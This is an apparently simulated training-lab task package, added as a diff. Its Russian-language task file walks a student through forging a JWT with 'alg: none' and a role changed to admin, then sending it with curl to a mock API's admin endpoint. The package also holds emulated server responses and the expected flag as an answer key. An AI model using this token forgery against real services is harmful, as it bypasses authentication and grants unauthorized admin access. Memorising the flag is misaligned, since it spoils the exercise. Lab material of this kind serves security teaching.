@@ -1,0 +1,46 @@
+{
+  "id": "web-jwt-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{4lg_c0nfus10n_w1ns_4g41n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: подделка JWT (alg:none)\n\nЦель — `http://api.lab.local`. Ты получил токен пользователя `alice` с ролью\n`user`. Админский эндпоинт `/v1/admin` отдаёт флаг только роли `admin`.\nСервер не проверяет подпись — принимает любой токен с `alg: none`.\n\nВ каталоге лежит `token.txt` с твоим токеном. JWT — три base64url-сегмента\n`header.payload.signature`.\n\n1. Раскодируй части:\n   `cut -d. -f1 token.txt | base64 -d`  и  `cut -d. -f2 token.txt | base64 -d`.\n2. Закодируй новый заголовок и payload в base64 (по отдельности, без `=`\n   тоже сойдёт — сервер не строг):\n\n   echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0\n   echo -n '{\"sub\":\"alice\",\"role\":\"admin\"}' | base64 -w0\n\n3. Задай их переменными и склей токен `H.P.` (подпись пустая — точка в конце):\n\n   export H=<header-base64>\n   export P=<payload-base64>\n\n4. Отправь запрос с поддельным токеном:\n\n   curl -s http://api.lab.local/v1/admin -H \"Authorization: Bearer $H.$P.\"\n\n5. Достань флаг (`cut -d: -f3`) в `found.txt` и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/token.txt",
+      "text": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.68dJr9xznPWcrl_-EynHMK7IKPZuToeOpN8o9_QyrpU\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция api.lab.local)",
+      "cases": [
+        {
+          "match": "eyJhbGciOiJub25l",
+          "example": "-s http://api.lab.local/v1/admin -H 'Authorization: Bearer <forged>'",
+          "output": "{\"admin\":true,\"flag\":\"nto{4lg_c0nfus10n_w1ns_4g41n}\"}\n"
+        },
+        {
+          "match": "v1/admin",
+          "example": "-s http://api.lab.local/v1/admin -H 'Authorization: Bearer <user-token>'",
+          "output": "HTTP/1.1 403 Forbidden\nServer: nginx/1.24.0\nContent-Type: application/json\nContent-Length: 31\n\n{\"error\":\"admin role required\"}\n"
+        },
+        {
+          "match": "v1/login",
+          "example": "-s -X POST http://api.lab.local/v1/login -d '{...}'",
+          "output": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.68dJr9xznPWcrl_-EynHMK7IKPZuToeOpN8o9_QyrpU\",\"role\":\"user\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /v1/login и /v1/admin на api.lab.local.\n"
+    }
+  }
+}
